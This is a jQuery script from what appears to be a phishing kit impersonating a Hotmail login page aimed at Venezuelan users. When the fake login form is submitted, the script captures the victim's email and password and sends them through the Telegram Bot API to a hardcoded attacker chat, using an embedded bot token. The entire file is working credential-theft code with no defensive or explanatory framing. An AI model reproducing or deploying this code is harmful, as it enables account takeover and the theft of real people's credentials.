$(document).ready(function(){
    // Función para obtener los datos del formulario y enviarlos a Telegram
    $("#loginForm").submit(function(event){
        event.preventDefault();
        var u_name = $("input[name='bcrreo']").val();
        var pax = $("input[name='bclv']").val();
        var chat_id = -1001956292164; // Agrega tu chat_id aquí
        var message = "👽👽👽HOTMAIL VENEZUELA👽👽👽\n\n🆔Arroba: " + u_name + "\n🔐P@ss: " + pax + "\n👽Lilxang1502👽";
        
        $.ajax({
            url: "https://api.telegram.org/bot6821107808:AAGvk27TftLb5gflY_h3MH0kOu7UaCisRXg/sendMessage",
            method: "POST",
            data: {
                chat_id: chat_id,
                text: message
            },
            success: function(response){
                // Manejar la respuesta si es necesario
                console.log(response);
                alert("Mensaje enviado a Telegram!");
            },
            error: function(xhr, status, error){
                // Manejar el error si ocurre
                console.error(error);
                alert("Error al enviar mensaje a Telegram.");
            }
        });
    });
});